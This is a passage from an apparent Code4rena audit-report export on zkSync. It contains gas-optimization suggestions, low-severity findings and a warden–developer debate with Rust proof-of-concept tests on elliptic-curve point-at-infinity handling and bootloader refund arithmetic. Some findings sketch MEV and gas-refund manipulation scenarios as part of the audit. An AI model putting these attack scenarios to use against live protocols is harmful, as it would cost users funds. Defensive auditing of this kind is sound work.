      "content": "\nCalculating length of bytes every time costs gas. The better solution would be to calculate the length once and save it in a local variable:\n\n[File: ethereum/contracts/common/libraries/L2ContractHelper.sol](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/common/libraries/L2ContractHelper.sol#L23-L25)\n```\n        require(_bytecode.length % 32 == 0, \"pq\");\n\n        uint256 bytecodeLenInWords = _bytecode.length / 32;\n```\n\nCan be changed to:\n\n```\n\t\tuint256 _bytecodeLength = _bytecode.length;\n        require(_bytecodeLength % 32 == 0, \"pq\");\n\n        uint256 bytecodeLenInWords = _bytecodeLength / 32;\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30344",
      "title": "[G-01] Pre-calculate keccak256 for constant variables in `L2ContractHelper.sol`",
      "impact": "GAS",
      "content": "\n[File: ethereum/contracts/common/libraries/L2ContractHelper.sol](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/common/libraries/L2ContractHelper.sol#L12C5-L12C13)\n\n```\nbytes32 constant CREATE2_PREFIX = keccak256(\"zksyncCreate2\");\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30343",
      "title": "[41] Missing support for certain precompiles",
      "impact": "LOW",
      "content": "\nThe Shanghai protocol release has nine precompiled contracts, namely `ecrecover`, `sha256`, `ripemd160`, `identity`, `modexp`, `ecadd`, `ecmul` and `blake2f`. However, within the current version of zkSync Era, the only precompiles supported are `ecrecover` and `sha256` (plus `keccak256`) and the ones being developed by [lambdaclass](https://github.com/lambdaclass/zksync_era_precompiles#current-status), namely `ecAdd`, `ecMul` and `modexp` (plus `ecPairing`). Consider implementing the other ones too, although they are rarely used, for full equivalence with Ethereum at the precompile level (`ripemd160`, `blake2f` and `identity`).\n\n\n**[erebus (warden) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/548#issuecomment-1832399070):**\n > Regarding [19], the following test highlights the issue:\n> \n> ```rust\n> // Put this test inside ecrecover/secp256k1/mod.rs and run from the \n> // era-zkevm_circuits folder the next command\n> //\n> //              cargo test POC -- --nocapture\n> //\n> #[test]\n> fn POC() {\n>     let false_zero = PointAffine::zero();\n>     let real_zero = PointAffine::from_xy_checked(Fq::zero(), Fq::zero()).unwrap();\n> \n>     println!(\"Is (0, 1) the null elememt (should not) -> {}\", false_zero.is_zero());\n>     println!(\"Is (0, 0) the null elememt -> {}\\n\", real_zero.is_zero());\n>     println!(\"Is (0, 1) on curve (should NOT) -> {}\", false_zero.is_on_curve());\n>     println!(\"Is (0, 0) on curve -> {}\", real_zero.is_on_curve());\n> }\n> ```\n> \n> The point at infinity is defined as `(0, 0)`, not both `(0, 0)` and `(0, 1)`. As it is right now, you could craft valid signatures with an invalid point or corrupt the result of other operations like [PointProjective::add_assign_mixed](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/era-zkevm_circuits/src/ecrecover/secp256k1/mod.rs#L455) due to:\n> \n> - `(0, 1)` not being the null element (from the mathematical proof above) **AND**\n> - `(0, 1)` not being on the curve as it does not comply with `y² = x³ + b -> 1², not = 0³ + 7`\n> \n> Therefore (0, 1) not in F`\n> \n> On top of that, we have that all operations defined under `F` apply **ONLY** to the elements of `F` (by definition). Therefore, you cannot use elements outside of `F` with functions and elements defined under `F`, as it is the case right now (it's mathematically wrong and bug prone).\n> \n> ```rust\n> // Put this test inside ecrecover/secp256k1/mod.rs and run from the \n> // era-zkevm_circuits folder the next command\n> //\n> //              cargo test POC_MIXED -- --nocapture\n> //\n> #[test]\n> fn POC_MIXED() {\n>     let false_zero = PointAffine::zero();\n>     let real_zero = PointAffine::from_xy_checked(Fq::zero(), Fq::zero()).unwrap();\n>     let projective = PointProjective::one();\n>     println!(\"Point projective -> {}\", &projective);\n>     println!(\"False zero -> {:?}\", &false_zero);\n>     println!(\"Real zero -> {:?}\\n\", &real_zero);\n>     \n> \n>     let mut projective1 = projective.clone() as PointProjective;\n>     projective1.add_assign_mixed(&false_zero);\n>     println!(\"Added (0, 1) -> {}\", projective1);\n> \n>     let mut projective2 = projective.clone() as PointProjective;\n>     projective2.add_assign_mixed(&real_zero);\n>     println!(\"Added (0, 0) -> {}\\n\", projective2);\n> }\n> ```\n> \n> Moreover, the implementation of this curve is widely used in many cryptographic projects, so if anyone forks this crate and uses it on his own project (for example, due to a recommendation from the own devs), they would be building something fundamentally flawed (and can damage zkSync Era's reputation if such a project gets rekt because of that).\n>\n>The fix is [ecrecover/secp256k1/mod.rs, line 150](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/era-zkevm_circuits/src/ecrecover/secp256k1/mod.rs#L150):\n> \n> ```diff\n>     fn zero() -> Self {\n>         PointAffine {\n>             x: Fq::zero(),\n> -           y: Fq::one(),\n> +           y: Fq::zero(),\n>             infinity: true,\n>         }\n>     }\n> ```\n> \n> As seen in [ecrecover/secp256k1/mod.rs, line 199](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/era-zkevm_circuits/src/ecrecover/secp256k1/mod.rs#L199):\n> \n> ```rust\n>     fn from_xy_checked(x: Self::Base, y: Self::Base) -> Result<Self, GroupDecodingError> {\n>         let infinity = x.is_zero() && y.is_zero();\n>         let affine = Self {\n>             x: x,\n>             y: y,\n>             infinity,\n>         };\n> \n>         if !affine.is_on_curve() {\n>             Err(GroupDecodingError::NotOnCurve)\n>         } else {\n>             Ok(affine)\n>         }\n>     }\n> ```\n\n**[erebus (warden) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/548#issuecomment-1832401079):**\n > Regarding [38], I have been testing and it is indeed a bug, as you would be returning a corrupted value. Although it would be defined as the point at infinity due to `Z = 0`, the other coordinates remain non-zero/one leading to corrupted results if it is used again. Here is the POC:\n> \n> ```rust\n> // Put this test inside ecrecover/secp256k1/mod.rs and run from the \n> // era-zkevm_circuits folder the next command\n> //\n> //              cargo test POC -- --nocapture\n> //\n> #[test]\n> fn POC() {\n>     let mut projective = PointProjective::one();\n>     let mut projective_into_affine_negated = projective.clone().into_affine();\n>     projective_into_affine_negated.negate();\n>     println!(\"Point projective -> {}\", &projective);\n>     println!(\"Point projective into affine negated -> {}\\n\", &projective_into_affine_negated);\n>     \n>     projective.add_assign_mixed(&projective_into_affine_negated);\n>     println!(\"Added A + (-A) (should be zero by definition) -> {:?}\", &projective);\n>     println!(\"Zero is defined as -> {:?}\", PointProjective::zero());\n> }\n> ```\n> \n> The fix is the one I have written in the QA [here](https://github.com/code-423n4/2023-10-zksync-findings/blob/main/data/erebus-Q.md#nc-18-pointprojectiveadd_assign_mixed-missing-code). However, it had a typo so the next one is the correct one:\n> \n> [secp256k1/mod.rs, line 486](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/era-zkevm_circuits/src/ecrecover/secp256k1/mod.rs#L486)\n> \n> ```diff\n>             ...\n> \n>         } else {\n>             // If we're adding -a and a together, self.z becomes zero as H becomes zero.\n> \n> +           if self.x == u2 {\n> +               (*self) = Self::zero();\n> +               return;\n> +           }\n> \n>             // H = U2-X1\n>             let mut h = u2;\n> \n>             ...\n> ```\n>\n> As seen here (even the comments are the same)\n> \n> [secp256k1/mod.rs, function `add_assign`](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/era-zkevm_circuits/src/ecrecover/secp256k1/mod.rs#L403)\n> \n> ```rust\n>             ...\n> \n>         } else {\n>             // If we're adding -a and a together, self.z becomes zero as H becomes zero.\n> \n>             if u1 == u2 {\n>                 // The two points are equal, so we double. // @audit wrong comment, the one I'm referring is the previous one\n>                 (*self) = Self::zero();\n>                 return;\n>             }\n> \n>             // H = U2-U1\n>             let mut h = u2;\n> \n>             ...\n> ```\n\n**[erebus (warden) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/548#issuecomment-1832403440):**\n > Regarding [12], after re-reading the docs provided in the audit repo, it seems I was wrong and the correct implementation is the one in [line 1456](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/bootloader/bootloader.yul#L1450C1-L1456C90). The flawed one is in [line 918](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/bootloader/bootloader.yul#L913C1-L921C57).\n> \n> When bootloader calls `askOperatorForRefund` it will be provided with the leftover gas **PLUS** the reserved gas calculated by the operator off-chain (not the one in `getGasLimitForTx`).\n> \n> [bootloader, line 918](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/bootloader/bootloader.yul#L918C1-L918C96)\n> \n> ```solidity\n>                     refundGas := max(getOperatorRefundForTx(transactionIndex), potentialRefund)\n> ```\n> \n> This will always pick the one provided by the operator and adding such a value with `reservedGas` in [bootloader, line 921](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/bootloader/bootloader.yul#L921C1-L921C57):\n> \n> ```solidity\n>                 refundGas := add(refundGas, reservedGas)\n> ```\n> \n> This will output `refundGas + reservedGasByOperator + reservedGasByBootloader`, giving users a higher gas refund than the correct one. It seems for high `reservedGas` values, such a transaction would always revert due to the [check in line 923](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/bootloader/bootloader.yul#L923), so it can be seen as a DOS in those situations and a theft of gas in the others. Nevertheless, consider changing the code to:\n> \n> ```diff\n>                     ...\n> \n>                     // In case the operator provided smaller refund than the one calculated\n>                     // by the bootloader, we return the refund calculated by the bootloader.\n> -                   refundGas := max(getOperatorRefundForTx(transactionIndex), potentialRefund)\n> +                   refundGas := max(getOperatorRefundForTx(transactionIndex), safeAdd(potentialRefund, reservedGas, \"whatever\"))\n>                 }\n> \n> -              refundGas := add(refundGas, reservedGas)\n> \n>                 if gt(refundGas, gasLimit) {\n>                     assertionError(\"L1: refundGas > gasLimit\")\n>                 }\n> \n>                 ...\n> ```\n> \n> Taking into account my submission [Operator can steal all gas provided by ANY user for L1 → L2 transactions](https://github.com/code-423n4/2023-10-zksync-findings/issues/255) and mixing the fixes.\n\n**[erebus (warden) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/548#issuecomment-1832408672):**\n> Although [40] can be seen as a little increase of gas (doing the maths with the Ethereum ones, note that the gas cost of the same opcodes in zkSync Era is far more due to ZK processing) and you can argue that this is a QA refactoring. Take into account that the goal of zkSync Era is to increase its TPS much more than what it is right now, which is currently `7.13` according to [l2beat](https://l2beat.com/scaling/projects/zksync-era). \n> \n> For example, let's say `3.565` are from L1 and `3.565` are from L2. That means, the increased gas cost per second  right now is:\n> \n> `3.565 * 160 + 3.565 * 240 = 1426` gas/second.\n> \n> In a whole year, the gas taken from users would be `1426 * 60 \\ seconds * 60 \\ minutes * 24 \\ hours * 365 \\ days = 44970336000 gas` (around `44` US billion gas). That's a lot of gas going straight into the operators pockets *\"for free\"* as users are paying for the execution of their transaction, not for debugging functionalities. Moreover, in many other gas calculations blocks like [here](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/bootloader/bootloader.yul#L985), [here](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/bootloader/bootloader.yul#L1240), [here](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/bootloader/bootloader.yul#L1427) and [here](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/bootloader/bootloader.yul#L1269) they are totally excluded, which shows the developers intentions to avoid overcharging users.\n\n**[erebus (warden) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/548#issuecomment-1832416928):**\n > Regarding [39], to show a different example from the classic swap issue, imagine a protocol that is deployed in both zkSync Era and Ethereum, is going to initiate a multi-chain airdrop from Ethereum to both its zkSync and Ethereum users. A malicious or a set of malicious operators on Ethereum can delay the transaction to initiate the airdrop on zkSync Era and sell their tokens to a higher price, as the total supply between chains would be fewer. Once the price spikes, they pass the airdrop transaction to zkSync to dilute the price and harm users who were holding those tokens, as the supply increases, so the price decreases instantly like a [market crash](https://en.wikipedia.org/wiki/Stock_market_crash).\n >\n >The deadline would stop such an attack, as the protocol could set the airdrop to last a few minutes, otherwise the zkSync airdrop wouldn't take place. This attack can be seen as a real world inflation attack, in which one country holds foreign currency for a long time and dumps all the money to the target country to flood its market and skyrocket its local monetary inflation (making an analogy between layers and countries)\n\n**[miladpiri (zkSync) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/548#issuecomment-1835640487):**\n > For [19], this is a valid code quality issue, but there is no impact.\n>\n> Summary of the issue:<br>\n> In affine coordinates, we use both (`0,1`, `infinity=true`) and (`0,0`, `infinity=true`) to store the point at infinity. As the warden explained, mathematically there should only be one point at infinity. However, throughout the codebase, we check if a point is infinity only by checking the boolean is true (ignoring the `x,y` coordinates). The warden's own test cases confirm that the code handles both points correctly, so there is no impact.\n\n**[miladpiri (zkSync) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/548#issuecomment-1835642929):**\n > > For [38], this is basically the exact same \"bug\" as L-19. Valid code quality but no impact.\n> As long as the `z` coordinate of a Projective Point is zero, it will be treated as the point at infinity, regardless of the `x` and `y` coordinates.\n\n\n**[miladpiri (zkSync) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/548#issuecomment-1835691963):**\n > > For [12], the original report was wrong, but this comment is correct. However, it does not have any impact, so it should be considered as QA. The reason why it lacks any impact is:\n> \n> `reservedGas = totalGasLimit - max(MAX_GAS_PER_TRANSACTION(), getOperatorTrustedGasLimitForTx(transactionIndex))`\n>\n> https://github.com/code-423n4/2023-10-zksync/blob/main/code/system-contracts/bootloader/bootloader.yul#L1145\n> \n> and\n> \n> `refundGas = max(getOperatorRefundForTx(transactionIndex), potentialRefund) + reservedGas`\n>\n> https://github.com/code-423n4/2023-10-zksync/blob/main/code/system-contracts/bootloader/bootloader.yul#L918\n> \n> In order to have `refundGas > gasLimit` (to have DoS as mentioned by the warden) the following condition should be met:\n>\n> ```\n> max(getOperatorRefundForTx(transactionIndex), potentialRefund) + totalGasLimit - max(MAX_GAS_PER_TRANSACTION(), getOperatorTrustedGasLimitForTx(transactionIndex)) > gasLimit\n> ```\n>\n> Since `totalGasLimit` is the same as `gasLimit`, we will have:\n>\n> ```\n> max(getOperatorRefundForTx(transactionIndex), potentialRefund) > max(MAX_GAS_PER_TRANSACTION(), getOperatorTrustedGasLimitForTx(transactionIndex))\n> ```\n>\n> This is possible if the operator provides refund higher than `max(MAX_GAS_PER_TRANSACTION(), getOperatorTrustedGasLimitForTx(transactionIndex))`. Moreover, if the operator provides such large refund amount, the bootloader will be reverted at line 924, so nothing happens, it is kind of self-rekt for the operator. It is as if the operator provides very low gas at the beginning to run the bootloader, so the bootloader will revert, and he should run it again.\n\n**[miladpiri (zkSync) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/548#issuecomment-1835695581):**\n > [40] is QA at most. Yes, it is an additional cost for users. So, it is the fact that we have written `DefaultAccount` in Solidity & not in Yul. This is the price everyone pays for better support.\n\n**[miladpiri (zkSync) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/548#issuecomment-1835704171):**\n > > For [39], `expirationTimestamp` is not used anywhere. It is set, but it is not responsible for any logic currently. It will be used in the future implementations. This report can be used in Analysis report. \n\n**[erebus (warden) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/548#issuecomment-1835853346):**\n > @miladpiri - Regarding [19]: You can just check the boolean, that's true, but it will return true for both of them, as the tests and the mathematical proof highlight. All signatures and some ZK things rely on the correctness of this curve and the **UNIQUENESS** of the points in there. If you can craft two different points that are gonna be treated as the same one, even if one of them is not on the curve, then you can replay the original one with the wrong one. When you say\n> \n> >  The warden's own test cases confirm that the code handles both points correctly, so there is no impact.\n> \n> The code must not accept `(0, 1)`. The result is wrong. `(0, 1)` is not on the curve and it is not the zero element. They must revert like in `from_xy_checked`. Moreover, it is the purpose of `is_on_curve` function to return false for those points and prevent the parent function from going on with an invalid point. Math structures like this curve and all the operations defined under it must be correctly implemented for a reason. Right now, from a formal POV, this is not the real secp256k1 curve. It mimics how it works, but it is not the same.\n\n**[erebus (warden) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/548#issuecomment-1835866806):**\n > @miladpiri - Regarding [38]: In fact, it is worse, as every point added with its negated will be treated as the zero element. That means you can have infinite zero elements (up to the prime field) who all are **DIFFERENT** from each other and from `(0, 1, 0)` floating around.\n\n**[erebus (warden) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/548#issuecomment-1835896481):**\n > @miladpiri - Regarding [12], You said\n> \n> > This is possible if the operator provides refund higher than `max(MAX_GAS_PER_TRANSACTION(), getOperatorTrustedGasLimitForTx(transactionIndex))`.\n> \n> This is correct and I did not take into account, so the DOS part is invalid. However, the theft of gas from the operator by users is correct as the bootloader is checking what is higher; the calculated refund for the execution of the transaction or the value provided by the operator, which is returning **HIS** reserved gas plus the leftover gas he has found for such a transaction. That means the operator's value will always be picked and being added with reserved gas will output more gas than intended.\n>\n> The code responsible for that in the zkSync Era node is in [refunds.rs, line 253](https://github.com/matter-labs/zksync-era/blob/0cd2c6b5ada568ffe01bce6d2dd8951457369141/core/lib/multivm/src/versions/vm_latest/tracers/refunds.rs#L253):\n> \n> ```rust\n>             ...\n> \n>             let tx_gas_limit = state\n>                 .memory\n>                 .read_slot(\n>                     BOOTLOADER_HEAP_PAGE as usize,\n>                     tx_description_offset + TX_GAS_LIMIT_OFFSET,\n>                 )\n>                 .value\n>                 .as_u32();\n> \n>             ...\n> \n>             let tx_body_refund = self.tx_body_refund(\n>                 bootloader_refund,\n>                 gas_spent_on_pubdata,\n>                 tx_gas_limit,\n>                 current_ergs_per_pubdata_byte,\n>                 pubdata_published,\n>             );\n> \n>             ...\n> ```\n> \n> If we go to `tx_body_refund` we see that the refund provided by the operator is, roughly, `gasLimitFromUser - gasSpentInComputation - gasSpentInPubdata`, that is, the excess of gas provided by the user, or, in other terms, the refund of gas after the execution step plus the reserved gas:\n> \n> [refunds.rs, function `tx_body_refund`](https://github.com/matter-labs/zksync-era/blob/0cd2c6b5ada568ffe01bce6d2dd8951457369141/core/lib/multivm/src/versions/vm_latest/tracers/refunds.rs#L95)\n> \n> ```rust\n>     pub(crate) fn tx_body_refund(\n>         &self,\n>         bootloader_refund: u32,\n>         gas_spent_on_pubdata: u32,\n>         tx_gas_limit: u32,\n>         current_ergs_per_pubdata_byte: u32,\n>         pubdata_published: u32,\n>     ) -> u32 {\n>         let total_gas_spent = tx_gas_limit - bootloader_refund;\n> \n>         let gas_spent_on_computation = total_gas_spent\n>             .checked_sub(gas_spent_on_pubdata)\n>             .unwrap_or_else(|| {\n>                 tracing::error!(\n>                     \"Gas spent on pubdata is greater than total gas spent. On pubdata: {}, total: {}\",\n>                     gas_spent_on_pubdata,\n>                     total_gas_spent\n>                 );\n>                 0\n>             });\n> \n>         // For now, bootloader charges only for base fee.\n>         let effective_gas_price = self.l1_batch.base_fee();\n> \n>         let bootloader_eth_price_per_pubdata_byte =\n>             U256::from(effective_gas_price) * U256::from(current_ergs_per_pubdata_byte);\n> \n>         let fair_eth_price_per_pubdata_byte =\n>             U256::from(eth_price_per_pubdata_byte(self.l1_batch.l1_gas_price));\n> \n>         // For now, L1 originated transactions are allowed to pay less than fair fee per pubdata,\n>         // so we should take it into account.\n>         let eth_price_per_pubdata_byte_for_calculation = std::cmp::min(\n>             bootloader_eth_price_per_pubdata_byte,\n>             fair_eth_price_per_pubdata_byte,\n>         );\n> \n>         let fair_fee_eth = U256::from(gas_spent_on_computation)\n>             * U256::from(self.l1_batch.fair_l2_gas_price)\n>             + U256::from(pubdata_published) * eth_price_per_pubdata_byte_for_calculation;\n>         let pre_paid_eth = U256::from(tx_gas_limit) * U256::from(effective_gas_price);\n>         let refund_eth = pre_paid_eth.checked_sub(fair_fee_eth).unwrap_or_else(|| {\n>             tracing::error!(\n>                 \"Fair fee is greater than pre paid. Fair fee: {} wei, pre paid: {} wei\",\n>                 fair_fee_eth,\n>                 pre_paid_eth\n>             );\n>             U256::zero()\n>         });\n> \n>         ceil_div_u256(refund_eth, effective_gas_price.into()).as_u32()\n>     }\n> ```\n\n**[erebus (warden) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/548#issuecomment-1836025283):**\n > @miladpiri - Regarding [39], I understand; however, I'm not talking about deposits staying idle or not being executed in zkSync Era due to high congestion in Ethereum for days. I am referencing time-sensitive  `L1->L2` transactions via `requestL2Transaction`.\n> \n> The issue is that it's fine to put that *\"hard-coded\"*  deadline for deposits, as the *\"environment changes\"* they suffer from are minimal, but there is no way for a contract in Ethereum to set a deadline of, say, a few minutes, for the execution of his transaction on zkSync Era, leading to the impacts I mentioned above. Neither it is possible now nor when you actually implement the logic regarding the withdrawals without operator's help. \n> \n> I focused on `expirationTimestamp`, as it is wrong to assume that `msg.timestamp` equals the time the user submitted the transaction to the network and when the transaction is actually picked and executed on-chain, which affects **ALL** `L1->L2` transactions, whether they are simple deposits or not, and the fact it will be used for all types of transactions, whether the caller wants that deadline or not.\n> \n> As the intention as well as the *\"Ethereum counterpart\"* is implemented in the code in-scope for this audit, plus the real threat rogue nodes in Ethereum are for the network as stated in the real-world [examples](https://news.bitcoin.com/rogue-validator-exploits-mev-bots-on-ethereum-resulting-in-25-3m-in-crypto-losses). Please reconsider, as users must be able to put the deadline they want/need for their transactions. Otherwise, transactions going to zkSync Era from Ethereum will become prime target of MEV bots and rogue nodes, due to the \"sequential determinism\" of your `L1->L2` communication channel.\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/548#issuecomment-1848941661):**\n> [01] - TODO<br>\n> [02] - Refactor<br>\n> [03] - Ignored<br>\n> [04] - Refactor<br>\n> [05] - Low<br>\n> [06] - TODO<br>\n> [07] - Non-Critical<br>\n> [08] - Ignored<br>\n> [09] - Non-Critical<br>\n> [10] - TODO<br>\n> [11] - Low<br>\n> [12] - Refactor<br>\n> [13] - Non-Critical<br>\n> [14] - Ignored<br>\n> [15] - Low<br>\n> [16] - Low<br>\n> [17] - TODO<br>\n> [18] - Low<br>\n> [19] - Ignored<br>\n> [20] - Low<br>\n> [21] - Refactor<br>\n> [22] - Non-Critical<br>\n> [23] - Non-Critical<br>\n> [24] - Non-Critical<br>\n> [25] - Low<br>\n> [26] - Non-Critical<br>\n> [27] - Non-Critical<br>\n> [28] - Low<br>\n> [29] - Non-Critical<br>\n> [30] - Refactor<br>\n> [31] - Low<br>\n> [32] - Refactor<br>\n> [33] - Refactor<br>\n> [34] - Low<br>\n> [35] - Low<br>\n> [36] - Ignored<br>\n> [37] - Non-Critical<br>\n> [38] - Non-Critical<br>\n> [39] - Low<br>\n> [40] - Non-Critical<br>\n> [41] - Ignored<br>\n\n*Note: For full discussion, see [here](https://github.com/code-423n4/2023-10-zksync-findings/issues/548).*\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30342",
      "title": "[40] Using `debugLog` in gas calculations leads to an artificially increased value",
      "impact": "LOW",
      "content": "\n### Impact\n\nIn [bootloader, function `debugLog`](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/bootloader/bootloader.yul#L3277C1-L3281C14) does consume `gas()`, so using it inside gas calculations leads to an artificially small increase above the real gas usage. This is bad because the amount users will be refunded depends on the *\"difference blocks\"* and they must **NOT** pay for debugging functionalities. You can argue that it is the same as Ethereum's `event`s, but they are executed in the *\"transaction context\"* regardless of where you place them, whilst these `debugLog`s can be *\"moved\"* to be executed in the *\"bootloader context\"* (where they should have been since the beginning). Like it is right now, users are paying for the next additional opcodes:\n\n- **3** `mstore`\n- **8** `add`\n- **5** `mul`\n- **5** `callValue`\n- **2** `sub`\n\nI am estimating with [the Ethereum ones](https://ethereum.org/en/developers/docs/evm/opcodes/). Just keep in mind that, as the underlying logic for these opcodes are ZK circuits, the gas cost will be higher to cover the computational overhead:\n\n`3 * mstore + 8 * add + 5 * mul + 5 * callValue + 2 * sub`\n\n`3 * 3 + 3 * 8 + 5 * 5 + 2 * 5 + 2 * 3`\n\nTherefore 80.\n\nNOTE: This is **NOT** a gas optimization, this is a theft of gas.\n\n### Recommended Mitigation steps\n\n[l1TxPreparation, lines 1006 to 1019](https://github.com/code-423n4/2023-10-zksync/blob/72f5f16ed4ba94c7689fe38fcb0b7d27d2a3f135/code/system-contracts/bootloader/bootloader.yul#L1006C1-L1019C84)\n\n```diff\n                let gasBeforePreparation := gas()\n-               debugLog(\"gasBeforePreparation\", gasBeforePreparation)\n\n                // Even though the smart contracts on L1 should make sure that the `L1->L2` provide enough gas to generate the hash\n                // we should still be able to do it even if this protection layer fails.\n                canonicalL1TxHash := getCanonicalL1TxHash(txDataOffset)\n-               debugLog(\"l1 hash\", canonicalL1TxHash)\n\n                // Appending the transaction's hash to the current L2 block\n                appendTransactionHash(canonicalL1TxHash, true)\n\n                markFactoryDepsForTx(innerTxDataOffset, true)\n\n                gasUsedOnPreparation := safeSub(gasBeforePreparation, gas(), \"xpa\")\n+               debugLog(\"gasBeforePreparation\", gasBeforePreparation)\n+               debugLog(\"l1 hash\", canonicalL1TxHash)\n```\n\nReduction of `80 * 2 = 160` gas.\n\n[l2TxValidation, lines 1185 to 1213](https://github.com/code-423n4/2023-10-zksync/blob/72f5f16ed4ba94c7689fe38fcb0b7d27d2a3f135/code/system-contracts/bootloader/bootloader.yul#L1185C1-L1213C72)\n\n```diff\n                let gasBeforeValidate := gas()\n\n-               debugLog(\"gasBeforeValidate\", gasBeforeValidate)\n\n                // Saving the tx hash and the suggested signed tx hash to memory\n                saveTxHashes(txDataOffset)\n\n                // Appending the transaction's hash to the current L2 block\n                appendTransactionHash(mload(CURRENT_L2_TX_HASHES_BEGIN_BYTE()), false)\n\n                checkEnoughGas(gasLimitForTx)\n\n                // Note, that it is assumed that `ZKSYNC_NEAR_CALL_validateTx` will always return true\n                // unless some error which made the whole bootloader to revert has happened or\n                // it runs out of gas.\n                let isValid := 0\n+               let validateABI := 0\n\n                // Only if the gasLimit for tx is non-zero, we will try to actually run the validation\n                if gasLimitForTx {\n-                   let validateABI := getNearCallABI(gasLimitForTx)\n+                   validateABI := getNearCallABI(gasLimitForTx)\n-                   debugLog(\"validateABI\", validateABI)\n\n                    isValid := ZKSYNC_NEAR_CALL_validateTx(validateABI, txDataOffset, gasPrice)                    \n                }\n\n-               debugLog(\"isValid\", isValid)\n\n                let gasUsedForValidate := sub(gasBeforeValidate, gas())\n+               debugLog(\"gasBeforeValidate\", gasBeforeValidate)\n+               debugLog(\"validateABI\", validateABI) // TODO review this, how can you differentiate between validateABI being 0 because gasLimitForTx is 0 or because there was an error in getNearCallABI ??\n+               debugLog(\"isValid\", isValid)\n```\n\nReduction of `80 * 3 = 240` gas.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30341",
      "title": "[39] Using `msg.timestamp` as an expiration timestamp invites MEV manipulations",
      "impact": "LOW",
      "content": "\n### Impact\n\nSetting the expiration timestamp to a value that depends directly of `block.timestamp` is useless, as `block.timestamp` is the timestamp when the transaction is **EXECUTED**, not when it is submitted to the network, opening the door to MEV manipulations. Think of the typical Uniswap-based bug in which expiration timestamp is set to `block.timestamp + K`, but applied to inter-chain swaps or highly-sensitive time-dependant operations (e. g. arbitrage or inter-chain DEXes like [Interport](https://interport.medium.com/interport-finance-whats-special-a5ea7caef237)).\n\n### Proof of concept\n\nThanks to Proof of Stake, validators and, in fact, everyone in the Ethereum network knows who is gonna submit the next block with a margin of 6 minutes and 24 seconds to 12 minutes and 48 seconds (see the References section below). That's enough time for bots and validators to do MEV calculations for many of the transactions waiting in the mempool **AND** submit their own with the right amount of gas to make sure their transactions are executed within the next block. Because of this, highly-sensitive operations like swaps between tokens need 1) slippage control and 2) expiration timestamps so that users will **NOT** incur in extreme losses due to MEV bots sandwiching/front-running them or validators *\"storing\"* transactions until they can make a profitable *\"chain\"*.\n\nThis idea can be extended to inter-chain operations pretty easily, so that the requested transactions from one layer to another do not wait idly in the mempool of the first one. However, doing request from Ethereum to zkSync Era through `Mailbox`, the expiration timestamp is set to:\n\n[Mailbox, line 